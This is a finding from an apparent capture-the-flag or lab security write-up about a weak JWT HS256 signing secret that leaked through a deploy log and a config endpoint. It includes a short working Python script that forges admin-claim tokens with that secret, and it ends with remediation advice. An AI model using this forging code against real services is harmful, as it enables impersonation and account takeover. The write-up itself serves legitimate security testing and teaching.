# Finding 13 — Weak / leaked JWT signing secret

**Flag:** none unique (the forgeable token is a building block, and the secret also appears in Flag 05's config leak).
**Severity:** High
**Class:** Broken authentication — weak, guessable, and disclosed signing key.

## Observation

The session is a HS256 JWT. Its secret is a short memorable word, `42network`, disclosed in the deploy-log comment and again in `/internal/config`. The console even advertises `secret entropy: "memorable"`. With the secret, any token can be forged:

```python
# HS256 forge with stdlib only
import hmac,hashlib,base64,json
b64=lambda b: base64.urlsafe_b64encode(b).rstrip(b'=')
h=b64(json.dumps({"alg":"HS256","typ":"JWT"},separators=(',',':')).encode())
p=b64(json.dumps({"sub":"<id>","login":"<user>","role":"admin","exp":1999999999},separators=(',',':')).encode())
sig=b64(hmac.new(b"42network",h+b'.'+p,hashlib.sha256).digest())
print((h+b'.'+p+b'.'+sig).decode())
```

## Note on exploitability

Forging the token authenticates as any user, but this app re-reads `role` from the database, so a forged `role` claim alone did not escalate (that required Findings 02/09). The forgeable secret still fully compromises any claim the server *does* trust, and is a critical weakness in its own right.

## Remediation

- Use a long, high-entropy, randomly generated secret; never a memorable word.
- Store it only in server-side secrets management; never in code comments, config endpoints, or client-visible logs.
- Rotate the secret now that it is exposed.
